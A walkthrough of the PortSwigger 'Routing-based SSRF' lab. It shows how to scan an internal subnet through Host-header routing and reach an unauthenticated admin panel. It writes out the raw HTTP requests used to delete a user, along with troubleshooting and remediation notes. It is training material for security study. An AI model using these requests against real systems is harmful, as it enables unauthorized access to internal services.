# Lab: Routing-Based SSRF

**Category:** HTTP Host Header Attacks
**Difficulty:** Practitioner
**Lab link:** [Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)

## Overview

The front-end load balancer routes requests to backend servers based on the `Host` header. By replacing the `Host` with an internal IP address, you can make the front-end proxy your request to an internal server — turning it into an SSRF vector. The internal admin panel at `192.168.0.0/24` has no authentication; access it to delete carlos.

## Key Concepts

- **Host-based routing:** The reverse proxy forwards requests to whichever backend the `Host` header resolves to — including internal IPs.
- **HTTP/1.1 required:** HTTP/2 uses the `:authority` pseudo-header tied to the established connection; changing `Host` has no effect. Must downgrade to HTTP/1.1 in Repeater.
- **CSRF + Referer check:** The internal admin form is CSRF-protected and also validates the `Referer` header — both must be present on the POST request.

## Solution

### Step 1 — Scan internal subnet with Intruder

Send any request to Intruder. Set payload position on the last octet:
```
Host: 192.168.0.§0§
```
- Attack type: Sniper
- Payload: Numbers 0–255
- Uncheck "Update Host header to match target"

Filter by different status/length to find the internal admin server IP.

### Step 2 — Access the admin panel (HTTP/1.1)

Switch Repeater to **HTTP/1.1** (dropdown top-right). Then:
```http
GET /admin HTTP/1.1
Host: 192.168.0.X
Cookie: session=<your-session>; _lab=<your-lab-cookie>
```

Returns the admin form with a CSRF token:
```html
<input type="hidden" name="csrf" value="TOKEN">
```

### Step 3 — Delete carlos

POST with both cookies and a `Referer` header (required to pass the CSRF check):
```http
POST /admin/delete HTTP/1.1
Host: 192.168.0.X
Cookie: session=<your-session>; _lab=<your-lab-cookie>
Referer: http://192.168.0.X/admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=TOKEN&username=carlos
```

Lab solved.

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| `421 Misdirected Request` / "Invalid host" | Burp using HTTP/2 | Switch Repeater to HTTP/1.1 |
| Timeout on POST | HTTP/2 silently used | Same fix — HTTP/1.1 |
| `403 Forbidden` | Missing Referer header | Add `Referer: http://192.168.0.X/admin` |
| `400 "Missing parameter 'csrf'"` | CSRF token not in body | Use POST with token in body, not GET |

## Remediation

- Validate the `Host` header against a strict allowlist of known hostnames.
- Do not use the `Host` header for routing decisions — use explicit upstream configuration.
- Restrict internal admin interfaces to network-level controls, not just obscurity.

## Key Takeaways

- Host-based routing is a powerful SSRF primitive — no URL parameter needed, just a header.
- Always try HTTP/1.1 when Host header manipulation gives unexpected results.
- Internal admin panels often have weaker protections — once reachable, CSRF is the only gate.
